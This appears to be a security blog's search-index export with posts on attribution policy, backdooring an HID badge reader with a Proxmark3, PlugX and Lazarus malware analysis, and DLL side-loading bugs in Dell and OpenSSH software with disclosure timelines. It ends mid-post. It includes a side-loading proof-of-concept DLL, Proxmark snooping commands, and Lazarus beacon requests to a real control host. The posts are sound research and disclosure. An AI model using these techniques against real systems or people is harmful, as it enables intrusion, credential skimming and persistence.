<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Killed In Translation</title>
      <link href="2021/01/14/KilledInTranslation/"/>
      <url>2021/01/14/KilledInTranslation/</url>
      
        <content type="html"><![CDATA[<p>Preface:<br>A director at Google once told me that the larger an organization, the less subtlety is possible in what it says publicly, and even the most carefully postulated assessment, cushioned with supporting analytic language, will be interpreted as fact.</p><hr><p>Naming of threat actor groups and malware is a critical aspect to tracking cyber operations. Armchair Researchers, more concerned with social media follower counts, often decry these names as marketing hooks, whereas they are actually complex shibboleths that convey the scope of a set of activity and its sourcing. </p><p>Since roughly 2016, the United States government has been actively working to collaborate with non-government agencies. The National Security Agency (NSA), Cybersecurity and Infrastructure Security Agency (CISA), and the Federal Bureau of Investigation (FBI) have all begun publicly sharing tactical reporting containing technical details, indicators, and defensive recommendations. These reports have become a staple of any major cyber incident because they provide an authoritative situational overview and an initial starting point for collaboration. </p><p>In recent reports[1][2],  attribution has been presented at the forefront of the report and used industry cryptonyms along with military units or specific government entities. While this may be intended to support broader usage (outside of technical consumers), attribution in these reports, without supporting analysis, is creating a dangerous precedent. </p><p>Technical analysis is fundamentally rooted in scientific methodology. When research is presented, a basic requirement is that it is sufficiently detailed to be validated by reproducing the analysis. Within the aforenoted reports, attribution is presented as a statement of fact, similar in confidence to the reported dates or software versions, instead of as a confidence-structured assessment. </p><p>It may be possible the authors of these reports have a Palantír[3], allowing them to perfectly identify the hostile authors, but without proper confidence language and presentation, these assessments are just as likely to have been made by a roll of the dice. </p><p>In future reports, providing context regarding how reported activity links to named sets will provide critical information to existing understanding of these groups. In instances where providing this information may risk sources and methods, limiting assessed attribution to a broad geographic estimate or omitting it entirely may provide a better service. </p><p>[1] <a href="https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf">https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf</a><br>[2] <a href="https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF">https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF</a><br>[3] <a href="https://en.wikipedia.org/wiki/Palant%C3%ADr">https://en.wikipedia.org/wiki/Palant%C3%ADr</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> policy non-technical naming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Backdooring a HID Reader</title>
      <link href="2020/11/03/Backdooring-a-HID-Reader/"/>
      <url>2020/11/03/Backdooring-a-HID-Reader/</url>
      
        <content type="html"><![CDATA[<p>A while back, I bought a <a href="https://www.hidglobal.com/products/readers/hid-proximity/5455">HID Prox Pro II</a> on eBay for some long-forgotten experiment — likely <a href="https://hackaday.com/2013/11/03/rfid-reader-snoops-cards-from-3-feet-away/">this</a>. Outside of being <a href="https://www.hidglobal.com/doclib/files/resource_files/5355a-900-n.3-proxpro-wiegnad-clock-and-data-install-guide-en.pdf">well documented</a> and <a href="https://www.ebay.com/sch/i.html?_from=R40&_nkw=HID+Prox+Pro+reader&_sacat=0&LH_TitleDesc=0&_sop=15">cheaply available</a>, @shakataganai wrote a fantastic <a href="https://obviate.io/2016/11/23/connecting-a-hid-prox-pro-ii-rfid-reader-to-arduino/">article</a> about how to connect it to an Arduino, which makes it ideal for some testing.</p><p><img src="/uploads/0*bHzHy2sHYVywzMZM.jpg" alt="HID Prox Pro II"></p><p>While exploring the device, I was disappointed that the actual components of the device (except the antenna) were sealed under some type of resin coating. Despite the components being inaccessible, I noticed there was a lot of available space inside…Big enough to fit an entire <a href="https://github.com/Proxmark/proxmark3">Proxmark3</a>. So — theoretically, it <a href="https://twitter.com/silascutler/status/1133723910413934592">may</a> be possible to install a device inside this empty space that could capture tag data whenever someone swipes.</p><p><img src="/uploads/1*AmxtYvKBO0nUKCcV3tIviQ.png" alt="Interior of HID reader"></p><p><img src="/uploads/1*kYxp2um0YDmjI3D_dSQsBg.png" alt="Proxmark3 sitting inside"></p><p>Feedback from folks on Twitter noted the potential for interference between the two devices — which makes sense, if the HID card reader is emitting a signal to power a card, a second device in close proximity could cause a problem.</p><p><img src="/uploads/1*tGuHUxsiGSce_kWV_VH_HA.png" alt="Reply from Iceman"></p><p>The argument is sound, I’d previously experimented with an <a href="https://itw01.com/QFUJAEK.html">Anti-NFC</a> card from CN360’s Unicorn team, which <a href="https://twitter.com/silascutler/status/912448923310149632">emits a signal to jam communication</a> between a <a href="https://twitter.com/silascutler/status/912445743008555009">reader and a tag</a>.</p><p><img src="/uploads/1*AwSHdI2odYiNHhYrZ_zaqA.png"></p><p>A possible way to get around this came from <a href="https://twitter.com/NotMedic">NotMedic</a> and <a href="https://twitter.com/herrmann1001">iceman</a> was to possibly wire the Proxmark to the device’s physical antenna.<br>From looking at the inside of the HID device, it wouldn’t be terribly hard to solder a lead to the exposed antenna connection — using an alligator clip may be faster.</p><p><img src="/uploads/1*E9BdKzeuubHe987xBCMRPg.png" alt="Antenna connection"></p><p>However, I wasn’t feeling bold enough to go that route, and opted to use the stock antenna and test things out. From the Proxmark client, I was able to verify readability of my testing tag/card.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; lf search</span><br><span class="line">NOTE: some demods output possible binary</span><br><span class="line">  if it finds something that looks like a tag          </span><br><span class="line">False Positives ARE possible</span><br><span class="line">Checking for known tags:</span><br><span class="line">          </span><br><span class="line">HID Prox TAG ID: 2e6277a2df          </span><br><span class="line">--------------------------------------------------          </span><br><span class="line">       Format: C1k35s (HID Corporate 1000 35-bit standard layout)          </span><br><span class="line">Facility Code: 787          </span><br><span class="line">  Card Number: 774511          </span><br><span class="line">       Parity: Valid          </span><br><span class="line">--------------------------------------------------</span><br><span class="line">Valid HID Prox ID Found!</span><br><span class="line">Using lf snoop, the device will eavesdrop in on the tag reads from the HID reader:</span><br><span class="line">proxmark3&gt; lf snoop</span><br><span class="line">proxmark3&gt; data sample</span><br><span class="line">Reading 39999 bytes from device memory</span><br><span class="line">Data fetched</span><br><span class="line">Samples @ 8 bits&#x2F;smpl, decimation 1:1</span><br><span class="line">proxmark3&gt; data plot</span><br></pre></td></tr></table></figure><p><img src="/uploads/1*N-ixJQaLMhVLrf4KgQzzwQ.png" alt="Plotted"></p><h3 id="Practicality"><a href="#Practicality" class="headerlink" title="Practicality"></a>Practicality</h3><p>While a nifty trick there are some practicalities that make conducting this a challenge:<br>Tamper sensors — as <a href="https://twitter.com/mdhardeman/status/1133759460487454721">mdhardeman pointed out</a> many HID readers have either optical or switch based tamper sensors to alert if someone attempts this.<br>Space &amp; Power— While Proxmark fits, I needed to run a USB cable out the back for power/comms, which was tricky. Use in the field may be better using something like a <a href="https://github.com/rfidtool/ESP-RFID-Tool">ESP-RFID-Tool</a>, as pointed out by <a href="https://twitter.com/jermainlaforce">jermainlaforce</a>. Despite the <a href="https://github.com/rfidtool/ESP-RFID-Tool">ESP-RFID-Tool</a> having a smaller footprint, it uses wifi — which unless carefully planned, could lead to having to physically be close to the backdoored HID reader.</p><p>(Post migrated from Medium - <a href="https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b">https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b</a> )</p>]]></content>
      
      
      
        <tags>
            
            <tag> stunthacks </tag>
            
            <tag> nfc </tag>
            
            <tag> rfid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fresh PlugX October 2019</title>
      <link href="2020/11/03/Fresh-PlugX-October-2019/"/>
      <url>2020/11/03/Fresh-PlugX-October-2019/</url>
      
        <content type="html"><![CDATA[<p>On 15 November 2019, I received a VirusTotal notification for a copy of PlugX that had been uploaded ( Yara - <code>PlugXBootLDRCode</code> from <a href="https://github.com/citizenlab/malware-signatures/blob/master/malware-families/plugx.yara">https://github.com/citizenlab/malware-signatures/blob/master/malware-families/plugx.yara</a> ).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MD5          : ce67994a4ee7cf90645e93aec084230d</span><br><span class="line">SHA1         : b42c84f851b8b7d2d2ddfbc9ac94e001204faf45</span><br><span class="line">SHA256       : 6b46e36245b5b9ed13c0fbfae730b49c04aba43b98deb75e388e03695ff5cbd1</span><br><span class="line">Type         : Win32 DLL</span><br><span class="line"></span><br><span class="line">First seen   : 2019-11-15 08:04:32 UTC</span><br><span class="line">Last seen    : 2019-11-15 08:04:32 UTC&amp;nbsp</span><br><span class="line"></span><br><span class="line">First name   : plugx.dll </span><br></pre></td></tr></table></figure><p>What stood out from the notification (outside of the file being named <code>plugx.dll</code>) was a compilation time of <code>Fri Oct 4 08:34:45 2019 UTC</code> (a little more then a month before the writing of this post).</p><h2 id="Initial-Validation"><a href="#Initial-Validation" class="headerlink" title="Initial Validation"></a>Initial Validation</h2><p>This specific rule matches on operations for assembling a set of API calls - shown below</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ yara -s All.yara sample</span><br><span class="line">PlugXBootLDRCode [PlugX,Family] 6b46e36245b5b9ed13c0fbfae730b49c04aba43b98deb75e388e03695ff5cbd1</span><br><span class="line">0x7708:$GetProcAdd: 80 38 47 75 36 80 78 01 65 75 30 80 78 02 74 75 2A 80 78 03 50</span><br><span class="line">0x7786:$L4_LoadLibraryA: C7 85 5C FF FF FF 4C 6F 61 64 C7 85 60 FF FF FF 4C 69 62</span><br><span class="line">0x7859:$L4_ExitThread: C7 85 FC FE FF FF 45 78 69 74 C7 85 00 FF FF FF 54 68 72 65</span><br></pre></td></tr></table></figure><p><img src="/uploads/Screenshot+at+2019-11-16+21-56-04.png" alt="Screenshot of match condition in IDA"></p><p><em>As a general note, the <code>-s</code> flag in Yara is used for outputting the matched strings and is extremely useful for debugging rules and evaluating why a file matched.</em></p><p>From a quick comparison of the strings, a quick Google search found previous reporting confirming this file was PlugX (ref: <a href="http://takahiroharuyama.github.io/blog/2014/03/27/id-slash-idapython-scripts-extracting-plugx-configs/">http://takahiroharuyama.github.io/blog/2014/03/27/id-slash-idapython-scripts-extracting-plugx-configs/</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DEMO...</span><br><span class="line">THIS IS A DEMO VERSION!!!</span><br><span class="line">\\.\PIPE\RUN_AS_USER(%d)</span><br><span class="line">%WINDIR%\SYSTEM32\SERVICES.EXE</span><br><span class="line">Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">System\CurrentControlSet\Services</span><br><span class="line">debug.hlp</span><br><span class="line">C:\Windows\System32\rundll32.exe &quot;%s&quot; BypassUAC %s</span><br><span class="line">PI[%8.8X]</span><br><span class="line">%s\%d.plg</span><br><span class="line">mytilus3.hlp</span><br><span class="line"></span><br><span class="line">%04d-%02d-%02d %02d:%02d:%02d</span><br></pre></td></tr></table></figure><h2 id="Overlaps-with-versions"><a href="#Overlaps-with-versions" class="headerlink" title="Overlaps with versions"></a>Overlaps with versions</h2><p>A outstanding point of reference evaluating PlugX is the Sophos report (<a href="https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf">https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf</a>).  On Page 7, Gabor Szappanos has a table covering the supported commands.  In this copy, <code>sub_10008DE</code> acts as a command handler for evaluating operator commands and can be used to evaluate this copy against that from 2014:</p><p><img src="/uploads/Screenshot+at+2019-11-16+21-50-14.png"></p><p>In the above screenshot, many of the commands from the 2014 version are present; some additional commands are present, however, handled withing sub-functions of <code>sub_10008DE</code>.</p><p>What did appear unique was a set of commands for monitor clipboard activity:</p><p><img src="/uploads/Screenshot+at+2019-11-16+22-25-08.png"></p><p>An initial Google search did not show any hits for these being previously documented commands in PlugX - suggesting it may be a new feature - however, further analysis is needed to validate this.</p>]]></content>
      
      
      
        <tags>
            
            <tag> malware </tag>
            
            <tag> reversing </tag>
            
            <tag> plugx </tag>
            
            <tag> china </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazarus obfuscation in Feb 2019</title>
      <link href="2020/11/03/Lazarus-obfuscation-in-Feb-2019/"/>
      <url>2020/11/03/Lazarus-obfuscation-in-Feb-2019/</url>
      
        <content type="html"><![CDATA[<p>Lazarus obfuscation in Feb 2019</p><p>Starting off, I’d like to give a shot-out to Brian Bartholomew (Twitter: @Mao_Ware) for his general awesomeness and for his post on 30 January from which this research starts.</p><p><img src="/uploads/Screenshot+at+2019-09-23+09-13-46.png"></p><p>Using this as a base for the following Yara rule, I found a similar sample (SHA256: <code>625f63364312cec78a4c91abedba868d551d79185ff73e388f561017b13347f0</code>) also packed with UPX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rule LazarusDocJan2019_01</span><br><span class="line">&#123;</span><br><span class="line">  meta:</span><br><span class="line">    author &#x3D; &quot;Silas Cutler&quot;</span><br><span class="line">    description &#x3D; &quot;Detection for Lazarus Payload from Jan 2019&quot;</span><br><span class="line">    ref &#x3D; &quot;https:&#x2F;&#x2F;twitter.com&#x2F;DrunkBinary&#x2F;status&#x2F;1090625122883510274&quot;</span><br><span class="line">    version &#x3D; &quot;0.1&quot;</span><br><span class="line">   strings:</span><br><span class="line">     $ &#x3D; &quot;\&quot;Main Invoked.\&quot;&quot;</span><br><span class="line">     $ &#x3D; &quot;\&quot;Main Returned.\&quot;&quot;</span><br><span class="line">     $ &#x3D; &quot;%sd.%se%sc %s &gt; %s 2&gt;&amp;1&quot;</span><br><span class="line">   condition:</span><br><span class="line">     all of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As with the sample Brian identified, the control server is not obfuscated in the binary:</p><p><img src="/uploads/1*wnzxT8mNHyMNvTx3gudlSQ.png" alt="Control server in `WinMain` function"></p><p>Sandboxing of the sample, confirms the malware beacons to this URL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;intro&#x2F;info&#x2F;info.asp?id&#x3D;dn678 HTTP&#x2F;1.1.</span><br><span class="line">Accept: *&#x2F;*.</span><br><span class="line">Accept-Encoding: gzip, deflate.</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E).</span><br><span class="line">Host: poem.ekosa.org.</span><br><span class="line">Connection: Keep-Alive.</span><br></pre></td></tr></table></figure><p>In IDA, we can see the malware uses the standard <code>LoadLibrary</code> / <code>GetProcessAddress</code> method for dynamically loading some key function calls. Shown below, the encoded string <code>y8zS2vHp8PLx//rK8dj38vvf</code> is base64 decoded and XORed by <code>0x9E</code>, resulting in the string <code>URLDownloadToFileA</code> that is passed to <code>GetProcAddress</code>.</p><p>The data returned by the control server is decoded using the same method as the <code>URLDownloadToFileA</code> (shown below).</p><p><img src="/uploads/1*2Uo3vIWWLhc2M2Xb3bCxew.png"></p><p>The decoded contents are written to disk for execution, unless the response starts with <code>sleep</code>, which will cause the sample to pause for <code>60000ms</code>, before retrying the request.</p><p>Sandboxing also showed the sample made several other HTTP calls to the same URL with the parameter string search=2tjbpK6urq6urq6u.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;intro&#x2F;info&#x2F;info.asp?search&#x3D;2tjbpK6urq6urq6u HTTP&#x2F;1.1.</span><br><span class="line">Accept: *&#x2F;*.</span><br><span class="line">Accept-Encoding: gzip, deflate.</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E).</span><br><span class="line">Host: poem.ekosa.org.</span><br><span class="line">Connection: Keep-Alive.</span><br></pre></td></tr></table></figure><p>In IDA, we can see that the <code>?search=</code> is concatenated to end of the URL along with a value that is XOR-encoded using a key of 0x9E and then base64 encoded, shown below.</p><p><img src="/uploads/1*yTg2BRkURLXEpnbqWiFCag.png" alt="indata is XOR encoded using 0x9E and then base64-ed"></p><p>Knowing the obfuscation is trivial, in a few lines of Python — the value being sent was <code>DFE:00000000</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) </span><br><span class="line">&gt;&gt;&gt; indata &#x3D; &quot;2tjbpK6urq6urq6u&quot;</span><br><span class="line">&gt;&gt;&gt; out &#x3D; &quot;&quot;</span><br><span class="line">&gt;&gt;&gt; for byte in indata.decode(&#39;base64&#39;):</span><br><span class="line">...  out +&#x3D; chr(ord(byte) ^ 0x9E)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; out</span><br><span class="line">&#39;DFE:00000000&#39;</span><br></pre></td></tr></table></figure><p>However, outside of the novel ability to decode something arbitrarily encode, this doesn’t provide any insight about functionality or purpose. Turning back to IDA, we can see the string DFE:%08x is a format string that takes an unsigned int. Looking at where this string is defined, we can see there are several similar strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417644 aIdDn678        db &#39;?id&#x3D;dn678&#39;</span><br><span class="line">.rdata:00417658 aSearch         db &#39;?search&#x3D;&#39;</span><br><span class="line">.rdata:00417664 aCfe08x         db &#39;CFE:%08x&#39;</span><br><span class="line">.rdata:00417670 aGfse08x        db &#39;GFSE:%08x&#39;</span><br><span class="line">.rdata:0041767C aLae08x         db &#39;LAE:%08x&#39;</span><br><span class="line">.rdata:00417688 aRfe08x         db &#39;RFE:%08x&#39;</span><br><span class="line">.rdata:00417780 aCpe08x         db &#39;CPE:%08x&#39; </span><br><span class="line">.rdata:0041778C aDfe08x         db &#39;DFE:%08x&#39;</span><br></pre></td></tr></table></figure><p>For each of these, the associated derived from <code>GetLastError()</code> (shown below).</p><p><img src="/uploads/1*y0QOM3r7drZeXHb15_CDKA.png"></p><p>Running through the rest of the file, the strings correlate as follows - <a href="https://gist.githubusercontent.com/silascutler/4245513e2dc1a7a9fc3d73346dd0cd12/raw/17d5bea8f80e73ca84a4ca0f36f19209c271f267/strfmt.csv">https://gist.githubusercontent.com/silascutler/4245513e2dc1a7a9fc3d73346dd0cd12/raw/17d5bea8f80e73ca84a4ca0f36f19209c271f267/strfmt.csv</a></p><p>(Post migrated from Medium - <a href="https://medium.com/emptyregisters/lazarus-downloader-brief-analy-17875f342d96">https://medium.com/emptyregisters/lazarus-downloader-brief-analy-17875f342d96</a> )</p>]]></content>
      
      
      
        <tags>
            
            <tag> lazarus </tag>
            
            <tag> malware </tag>
            
            <tag> dprk </tag>
            
            <tag> reversing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Finding the same bugs in all the familiar places</title>
      <link href="2020/11/03/Finding-the-same-bugs-in-all-the-familiar-places/"/>
      <url>2020/11/03/Finding-the-same-bugs-in-all-the-familiar-places/</url>
      
        <content type="html"><![CDATA[<h3 id="Migrated-Post"><a href="#Migrated-Post" class="headerlink" title="(Migrated Post)"></a>(Migrated Post)</h3><p>A while back, I had a patch of cases where I was regularly looking at samples leveraging DLL Side loading (also called <code>Search Order Hijacking</code>) as part of their setup phase.  This vulnerability exists because of how Windows handles resolving libraries for applications and can be exploited to cause an application to inadvertently load (at the same privilege level) a malicious library.  When a library is<br>loaded by an application (either delayed or at execution), Windows will check the following locations<br> in order for a copy of the library:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.soh.png" alt="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order"></p><p>The above shows the locations checked when SafeDllSearchMode is disabled.  When enabled, the current directory is checked fifth, instead of second.  </p><p>This process can be exploited when a malicious library is added to one of these locations - before<br>the actual library natively resides.  For example, if <code>MyApp.exe</code> is attempting to load <code>TestLib.dll</code>,<br>which is located in SYSTEM32 (location #3 above) and an attacker deploys a malicious copy to the current working directory<br> (#2 above) - the malicious copy will be loaded, instead of the native copy.  </p><p>Exploitation of this technique in the wild has been commonly used by attackers for mainly:</p><ul><li>Initial access deployment - <em>In observed cases, a vulnerable legitimate and signed executable is bundled with a malicious<br>library and obfuscated payload inside of a Self-Extracting (SFX) RAR Archive.</em> </li><li>System persistence - <em>Attackers install a malicious library to the same folder as a vulnerable application that is<br>regularly executed or run as a system service</em></li></ul><p>Some have argued that DLL Side loading is an Antivirus (AV) vulnerability - based on the<br>assumption /  that detection engines only look at the parent process and make a determination<br>based on that.  While that may be the case for some AV products (and of those from 2005), the<br>vulnerability can be exploited for tactical uses, beyond a detection bypass.  In addition to being<br>usable for persistence, because the side loaded libraries are run at the same privilege level as<br>the associated process, if loaded by a system services, it would be possible to escalate to<br>SYSTEM level. </p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.calc_open.png" alt="Calc.exe opened by maliciously library loaded by vulnerable application"></p><p>Following are two interesting applications I found that were vulnerable to DLL Side loading that<br>have finished the notification process and some analytical assessments of each:</p><h3 id="Dell-Power-Management-Packages"><a href="#Dell-Power-Management-Packages" class="headerlink" title="Dell Power Management Packages"></a>Dell Power Management Packages</h3><p>While rebuilding a bare-metal sandbox, I ran the Dell Power Management Service Updater ( <code>Dell-Power-Manager-Service_XJ50Y_WIN64_3.0.0_A00.EXE</code> / SHA256 Hash<br><code>62dcd3ba9a005255a651dfb601405a6258312cbcd1bdf63489f65837b212601a</code>) through<br><a href="https://github.com/Cybereason/siofra">Siofra</a> as a cursory check.  </p><p>Following is the output from this check:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.sofria.png" alt="Output"></p><p>From the output, six of the dependencies of this installer were flagged as vulnerable.  Using<br>Process Monitor when the installer was executed (from <code>C:\Users\User\Desktop\</code>), the highlighted lines show the installer first attempting to open VERSION.dll from the same directory as the installer, before then moving on to SYSTEM32 - showing that the installer was highly-likely vulnerable.</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.procmon.png" alt="Output"></p><p>In order to confirm fully this vulnerability, a PoC malicious library was written in Visual Studio with<br> the same exports as VERSION.dll linked to the original library. The main components of this<br> are DllMain, which contains a switch statement with a WinExec call to open calc.exe<br>whenever the library is loaded (shown first), and the links to the original library exports<br> (shown second):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved )</span><br><span class="line">&#123;</span><br><span class="line"> switch (ul_reason_for_call)</span><br><span class="line"> &#123;</span><br><span class="line">  case DLL_PROCESS_ATTACH:</span><br><span class="line">  &#123;</span><br><span class="line">   WinExec(&quot;c:\\windows\\system32\\calc.exe&quot;, SW_SHOW);</span><br><span class="line">  &#125;</span><br><span class="line">  case DLL_THREAD_ATTACH:</span><br><span class="line">  &#123;</span><br><span class="line">   WinExec(&quot;c:\\windows\\system32\\calc.exe&quot;, SW_SHOW);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;export:GetFileVersionInfoA&#x3D;C:&#x2F;Windows&#x2F;System32&#x2F;version.GetFileVersionInfoA&quot;)</span><br></pre></td></tr></table></figure><p>The result of this is a beautiful waterfall of calc when the installer is loaded:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.calc_waterfall.png" alt="Output"></p><p>What makes this case interesting is that the vulnerable application is installed by default on some new Dell systems.  For an attacker, this type of vulnerability could be trivially leveraged for persistence - given the large-installation base.   </p><p>Notification Timeline:</p><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2018 May  9</td><td>Reported to Dell</td></tr><tr><td>2018 May  9</td><td>Dell acknowledge receipt</td></tr><tr><td>2018 May 15</td><td>Dell re-acknowledge receipt</td></tr><tr><td>2019 May 20</td><td>Dell provides update stating review is in final review and release coming soon</td></tr><tr><td>2019 June 3</td><td>Dell provides update that another researcher has submitted additional information related to original vulnerability</td></tr><tr><td>2019 September 1</td><td>I Requested status update</td></tr><tr><td>2019 September 4</td><td>Dell states the review is in final review and update coming next week</td></tr><tr><td>2019 September 12</td><td>Dell publishes Security Advisory (DSA-2019-065 / CVE-2019-3726)</td></tr></tbody></table><h3 id="Windows-10-OpenSSH-Client"><a href="#Windows-10-OpenSSH-Client" class="headerlink" title="Windows 10 OpenSSH Client"></a>Windows 10 OpenSSH Client</h3><p>While preparing for the 2019 Northeast Collegiate Cyber Defense Competition (NECCDC) I<br> found that several of the executable files (listed below) for OpenSSH for Windows (version <code>7.6.0.0</code>)<br>were also vulnerable to DLL Side loading, using the same method of identification with Siofra,<br>validation with ProcessMonitor and validation with a PoC.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\OpenSSH\scp.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\sftp.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-add.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-agent.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-keygen.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-keyscan.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh.exe </span><br></pre></td></tr></table></figure><p>In each of the vulnerable executable files, the following libraries could be used for exploitation:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bcrypt.dll</span><br><span class="line">logoncli.dll</span><br><span class="line">netutils.dll</span><br><span class="line">ntmarta.dll</span><br><span class="line">samcli.dll</span><br><span class="line">SspiCli.dll</span><br><span class="line">wkscli.dll</span><br></pre></td></tr></table></figure><p>Unlike the previous case, this vulnerability is inherently interesting because of the large base of potentially vulnerable systems.  However, this vulnerability impacting OpenSSH allows for a number of theoretically possible attacks, that may not applicable to large-scale usage, but may be of high value in a targeted attack scenario.</p><p>Notification Timeline:</p><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2019 March 11</td><td>Reported to Microsoft MSRC</td></tr><tr><td>2019 March 11</td><td>Received automated acknowledgement</td></tr><tr><td>2019 March 20</td><td>Received acknowledgement report was being reviewed</td></tr><tr><td>2019 March 28</td><td>Microsoft verified the issue, however determined it 